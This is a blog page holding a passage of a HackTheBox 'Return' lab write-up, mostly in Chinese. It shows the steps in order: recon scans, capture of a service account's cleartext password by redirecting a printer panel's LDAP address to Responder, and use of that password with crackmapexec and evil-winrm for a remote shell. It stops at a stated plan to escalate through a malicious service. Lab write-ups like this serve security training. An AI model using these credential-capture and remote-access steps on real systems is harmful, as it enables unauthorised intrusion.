@@ -1,0 +1,682 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HackTheBox-ReturnRecon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Nmap scan report for return.htb (10.10.11.108)Host is up (0.36s latency).Not shown:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Return">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Return/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="HackTheBox-ReturnRecon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Nmap scan report for return.htb (10.10.11.108)Host is up (0.36s latency).Not shown:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220515220255032.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220515220756621.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220515230220445.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.873Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:35.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220515220255032.png">
+  
+  
+  
+  <title>HackTheBox-Return - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Return"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Return</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HackTheBox-Return"><a href="#HackTheBox-Return" class="headerlink" title="HackTheBox-Return"></a>HackTheBox-Return</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> return.htb (10.10.11.108)<br>Host is up (0.36s latency).<br>Not shown: 65509 closed tcp ports (reset)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: HTB Printer Admin Panel<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-15 14:51:01Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49665/tcp open  msrpc         Microsoft Windows RPC<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49671/tcp open  msrpc         Microsoft Windows RPC<br>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49675/tcp open  msrpc         Microsoft Windows RPC<br>49679/tcp open  msrpc         Microsoft Windows RPC<br>49682/tcp open  msrpc         Microsoft Windows RPC<br>49690/tcp open  msrpc         Microsoft Windows RPC<br>49694/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: 18m34s<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-15T14:52:00<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 857.68 seconds<br></code></pre></td></tr></table></figure>
+
+<h4 id="Port-53"><a href="#Port-53" class="headerlink" title="Port 53:"></a>Port 53:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dig axfr @10.10.11.108 return.local<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.108 return.local<br>; (1 server found)<br>;; global options: +cmd<br>; Transfer failed.<br></code></pre></td></tr></table></figure>
+
+<h4 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80 :"></a>Port 80 :</h4><img src="https://www.worldisend.com/img/image-20220515220255032.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220515220255032" style="zoom:200%;" />
+
+<img src="https://www.worldisend.com/img/image-20220515220756621.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220515220756621" style="zoom:200%;" />
+
+<p>密码我试着改，没成功提示也没返回提示，而我输入的是五个字符admin，提交之后变成了7个*，不过是用PHP开发的WEB管理页面：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/settings.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>return.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://return.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://return.htb/settings.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span>printer.return.local</span><br></code></pre></td></tr></table></figure>
+
+<p>我提交的密码并不会出现在数据包中，我可以尝试把IP改成自己的，然后开启嗅探：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo responder -I tun0            <br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.1.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.10.16.6]<br>    Responder IPv6             [dead:beef:4::1004]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220515230220445.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220515230220445" style="zoom:200%;" />
+
+<h4 id="Port-139-445："><a href="#Port-139-445：" class="headerlink" title="Port 139,445："></a>Port 139,445：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.108 --shares -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br>SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)<br>SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! <br>SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares<br>SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark<br>SMB         10.10.11.108    445    PRINTER          -----           -----------     ------<br>SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin<br>SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share<br>SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC<br>SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share <br>SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share <br></code></pre></td></tr></table></figure>
+
+<p>都是默认共享。</p>
+<h4 id="Port-135"><a href="#Port-135" class="headerlink" title="Port 135:"></a>Port 135:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; rpcclient //10.10.11.108/ -U svc-printer<br>Cannot connect to server.  Error was NT_STATUS_UNSUCCESSFUL<br></code></pre></td></tr></table></figure>
+
+<p>Rpc不让连。</p>
+<h4 id="Port-5985："><a href="#Port-5985：" class="headerlink" title="Port 5985："></a>Port 5985：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec winrm 10.10.11.108 -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span> <br>SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)<br>HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman<br>WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;&gt; evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.108</span> <span class="hljs-literal">-u</span> svc<span class="hljs-literal">-printer</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Documents&gt; <span class="hljs-built_in">cd</span> ~<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>&gt; <span class="hljs-built_in">ls</span><br><br>    Directory: C:\Users\svc<span class="hljs-literal">-printer</span><br>    <br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">05</span> AM                Desktop<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">1</span>:<span class="hljs-number">51</span> AM                Documents<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Downloads<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Favorites<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Links<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Music<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Pictures<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Saved Games<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Videos<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>&gt; <span class="hljs-built_in">cd</span> Desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <span class="hljs-built_in">ls</span><br><br>    Directory: C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">29</span> AM             <span class="hljs-number">34</span> user.txt<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <span class="hljs-built_in">type</span> user.txt<br>fe9...............................<br></code></pre></td></tr></table></figure>
+
+<p>这账户权限很高，加载恶意驱动，备份转储哈希：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br><span class="hljs-literal">----------------------</span><br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeLoadDriverPrivilege         Load and unload device drivers      Enabled<br>SeSystemtimePrivilege         Change the system time              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the time zone                Enabled<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; whoami /groups<br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                 <span class="hljs-built_in">Type</span>             SID          Attributes<br>========================================== ================ ============ ==================================================<br>Everyone                                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Server Operators                   Alias            S<span class="hljs-literal">-1-5-32-549</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Print Operators                    Alias            S<span class="hljs-literal">-1-5-32-550</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Management Users            Alias            S<span class="hljs-literal">-1-5-32-580</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                              Alias            S<span class="hljs-literal">-1-5-32-545</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span class="hljs-number">2000</span> Compatible Access Alias            S<span class="hljs-literal">-1-5-32-554</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                       Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users           Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NTLM Authentication           Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>  Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\High Mandatory Level       Label            S<span class="hljs-literal">-1-16-12288</span><br></code></pre></td></tr></table></figure>
+
+<p>创建个恶意服务就可以轻松获取系统权限：</p>
